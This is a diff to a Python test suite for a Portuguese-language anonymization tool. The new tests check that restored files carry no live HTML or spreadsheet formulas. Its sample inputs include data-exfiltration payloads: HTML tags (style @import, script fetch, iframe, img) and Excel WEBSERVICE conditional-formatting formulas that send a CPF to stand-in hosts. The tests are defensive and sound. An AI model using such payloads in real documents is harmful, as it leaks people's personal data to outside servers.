@@ -287,7 +287,7 @@ class Arquivos(unittest.TestCase):
         self.assertIn("[perfil](https://x.com/u/[PESSOA_1])", out)
         self.assertIn("[ver [PESSOA_1]](/pasta/[CPF_1].md)", out)   # colado em "](/...": não troca
         self.assertIn("https://x.com/?c=[CPF_1] e www.x.com/[CPF_1] e mailto:[PESSOA_1]@x.com", out)
-        self.assertIn("<https://x.com/[CPF_1]>", out)
+        self.assertIn("&lt;https://x.com/[CPF_1]>", out)
         self.assertIn("[ref]: https://x.com/[CPF_1]", out)
         self.assertIn("data:text/plain,[CPF_1]", out)
         self.assertTrue(out.endswith("CPF 52998224725"))
@@ -352,7 +352,10 @@ class Arquivos(unittest.TestCase):
                 out = f.read()
             self.assertTrue(out.startswith("Oi Ana Lima!"), out)
             self.assertTrue(out.endswith(esperado_fim), out)
-            self.assertEqual(out.count("52998224725"), 1, out)   # só a do fim
+            if nome == "r.txt":
+                self.assertEqual(out.count("52998224725"), 1, out)   # só a do fim
+            else:
+                self.assertNotIn("<", out)
         t = motor.tratar({"op": "reverter_texto", "texto": entrada, "tabela": tabela})
         self.assertEqual(t["texto"].count("52998224725"), 1)
         csv_ = self.arquivo("c.csv", 'a,b\n"<img src=""//x.example/?c=[CPF_1]"">",[CPF_1]\nx.example/?c=[CPF_1],[PESSOA_1]\n')
@@ -582,6 +585,106 @@ class Arquivos(unittest.TestCase):
         with self.assertRaises(motor.ErroMotor) as cm:
             ooxml.conferir_sem_formulas(ruim, "ruim.xlsx")
         self.assertEqual(cm.exception.codigo, "formula_residual")
+
+    def test_reverter_md_desativa_html_cru_mas_deixa_codigo(self):
+        tabela = [{"tipo": "CPF", "valor": "52998224725", "marcador": "[CPF_1]"}]
+        md = ('Dados: [CPF_1]\n'
+              '<style>@import "https://coletor.example/?cpf= [CPF_1] ";</style>\n'
+              '<script>fetch("//x.example/ [CPF_1]")</script>\n'
+              '<iframe src="https://x.example/ [CPF_1]"></iframe>\n<svg><image href="https://x.example/ [CPF_1]"/></svg>\n'
+              '<math><mtext>[CPF_1]</mtext></math>\n<template><img src="https://x.example/ [CPF_1]"></template>\n'
+              'Em código: `<b>[CPF_1]</b>` e\n```html\n<div class="x">[CPF_1]</div>\n```\nFim [CPF_1].')
+        saida = os.path.join(self.tmp, "h.md")
+        r = motor.tratar({"op": "reverter", "entrada": self.arquivo("h.md", md), "saida": saida, "tabela": tabela})
+        self.assertTrue(r["ok"], r)
+        self.assertTrue(any("HTML" in a for a in r["avisos"]), r["avisos"])
+        with open(saida, encoding="utf-8") as f:
+            out = f.read()
+        fora = out.replace("`<b>[CPF_1]</b>`", "").replace('<div class="x">[CPF_1]</div>', "")
+        for tag in ("<style", "<script", "<iframe", "<svg", "<math", "<template", "<img"):
+            self.assertNotIn(tag, fora, tag)
+        self.assertIn("&lt;style>", out)
+        self.assertIn("`<b>[CPF_1]</b>`", out)           # código fica como estava (a proteção de tag mantém o marcador)
+        self.assertIn('<div class="x">[CPF_1]</div>', out)   # bloco de código também
+        self.assertTrue(out.startswith("Dados: 52998224725"))
+        self.assertTrue(out.endswith("Fim 52998224725."))
+
+    @unittest.skipUnless(tem("openpyxl"), "openpyxl não está instalado neste Python")
+    def test_xlsx_reverter_tira_formatacao_condicional_e_extlst(self):
+        import openpyxl
+        import ooxml
+        wb = openpyxl.Workbook()
+        wb.active["A1"] = "[CPF_1]"
+        origem = os.path.join(self.tmp, "cf.xlsx")
+        wb.save(origem)
+        cf = (b'<conditionalFormatting sqref="A1"><cfRule type="colorScale" priority="1"><colorScale>'
+              b'<cfvo type="formula" val="WEBSERVICE(&quot;https://x/?d=&quot;&amp;$A$1)"/><cfvo type="max"/><color rgb="FFFF0000"/><color rgb="FF00FF00"/>'
+              b'</colorScale></cfRule></conditionalFormatting>')
+        ext = (b'<extLst><ext uri="{78C0D931-6437-407d-A8EE-F0AAD7539E65}" xmlns:x14="http://schemas.microsoft.com/office/spreadsheetml/2009/9/main" '
+               b'xmlns:xm="http://schemas.microsoft.com/office/excel/2006/main"><x14:conditionalFormattings><x14:conditionalFormatting><x14:cfRule type="expression" priority="2">'
+               b'<xm:f>WEBSERVICE($A$1)</xm:f></x14:cfRule></x14:conditionalFormatting></x14:conditionalFormattings></ext></extLst>')
+        injetado = os.path.join(self.tmp, "cf2.xlsx")
+        with zipfile.ZipFile(origem) as zin, zipfile.ZipFile(injetado, "w") as zout:
+            for info in zin.infolist():
+                dados = zin.read(info.filename)
+                if info.filename == "xl/worksheets/sheet1.xml":
+                    dados = dados.replace(b"</worksheet>", cf + ext + b"</worksheet>")
+                zout.writestr(info, dados)
+        with self.assertRaises(motor.ErroMotor):
+            ooxml.conferir_sem_formulas(injetado, "cf2.xlsx")
+        saida = os.path.join(self.tmp, "cf-saida.xlsx")
+        r = motor.tratar({"op": "reverter", "entrada": injetado, "saida": saida, "tabela": [{"tipo": "CPF", "valor": "52998224725", "marcador": "[CPF_1]"}]})
+        self.assertTrue(r["ok"], r)
+        with zipfile.ZipFile(saida) as z:
+            for n in z.namelist():
+                if n.endswith(".xml"):
+                    xml = z.read(n).decode("utf-8")
+                    for proibido in ("conditionalFormatting", "extLst", "cfvo", "WEBSERVICE", "xm:f"):
+                        self.assertNotIn(proibido, xml, n)
+        self.assertEqual(openpyxl.load_workbook(saida).active["A1"].value, "52998224725")
+
+    @unittest.skipUnless(tem("openpyxl"), "openpyxl não está instalado neste Python")
+    def test_planilha_enorme_com_duas_celulas_e_recusada_rapido(self):
+        import openpyxl
+        import time
+        wb = openpyxl.Workbook()
+        wb.active["A1"] = "x"
+        wb.active["XFD1048576"] = "y"
+        origem = os.path.join(self.tmp, "bomba.xlsx")
+        wb.save(origem)
+        self.assertLess(os.path.getsize(origem), 20000)
+        t0 = time.time()
+        r = self.pedir(origem)
+        self.assertFalse(r["ok"])
+        self.assertEqual(r["codigo"], "planilha_grande")
+        self.assertIn("bomba.xlsx", r["erro"])
+        r = motor.tratar({"op": "reverter", "entrada": origem, "saida": os.path.join(self.tmp, "b-out.xlsx"), "tabela": []})
+        self.assertEqual(r["codigo"], "planilha_grande")
+        self.assertLess(time.time() - t0, 30)
+        self.assertFalse(os.path.exists(self.saida) and os.listdir(self.saida))
+
+    @unittest.skipUnless(tem("docx") and tem("lxml"), "python-docx não está instalado neste Python")
+    def test_docx_chave_pix_em_atributo_de_texto_nao_escapa(self):
+        import docx
+        from docx.oxml import OxmlElement
+        from docx.oxml.ns import qn
+        d = docx.Document()
+        p = d.add_paragraph("clique ")
+        link = OxmlElement("w:hyperlink")
+        link.set(qn("w:anchor"), "x")
+        link.set(qn("w:tooltip"), "123e4567-e89b-12d3-a456-426614174000")
+        run = OxmlElement("w:r")
+        t = OxmlElement("w:t")
+        t.text = "aqui"
+        run.append(t)
+        link.append(run)
+        p._p.append(link)
+        origem = os.path.join(self.tmp, "pix.docx")
+        d.save(origem)
+        r = self.pedir(origem)
+        self.assertTrue(r["ok"], r)
+        self.assert_limpo(os.path.join(self.saida, "doc-1.anon.docx"), ["123e4567-e89b-12d3-a456-426614174000"])
+        self.assertIn("[PIX_1]", r["usados"])
 
     def test_pptx_reverter(self):
         slide = ('<?xml version="1.0"?><p:sld xmlns:a="a" xmlns:p="p"><a:p><a:r><a:t>Cliente [PESS</a:t></a:r>'
@@ -909,6 +1012,17 @@ class Regras(unittest.TestCase):
         self.assertEqual(documentos.trocar_texto_de_celula(s, "11988776655", "Celular"), "[TELEFONE_1]")
         self.assertEqual(documentos.trocar_texto_de_celula(s, "445566-7", "Conta"), "[CONTA_1]")
         self.assertEqual(documentos.trocar_texto_de_celula(s, "1001", "Matrícula"), "1001")
+
+
+class Teto(unittest.TestCase):
+    def test_teto_de_memoria_vira_memoryerror_e_volta_ao_normal(self):
+        codigo = ("import sys; sys.path.insert(0, %r)\nimport motor\n"
+                  "with motor.teto_de_memoria(64):\n"
+                  "    try:\n        bytearray(700 * 1024 * 1024); print('sem-teto')\n"
+                  "    except MemoryError:\n        print('estourou')\n"
+                  "x = bytearray(700 * 1024 * 1024); print('normal')\n" % AQUI)
+        r = subprocess.run([sys.executable, "-I", "-c", codigo], capture_output=True, text=True, timeout=60, env=dict(os.environ, DGCLAW_ANON_NER="falso"))
+        self.assertEqual(r.stdout.split(), ["estourou", "normal"], r.stderr[-300:])
 
 
 class Protocolo(unittest.TestCase):
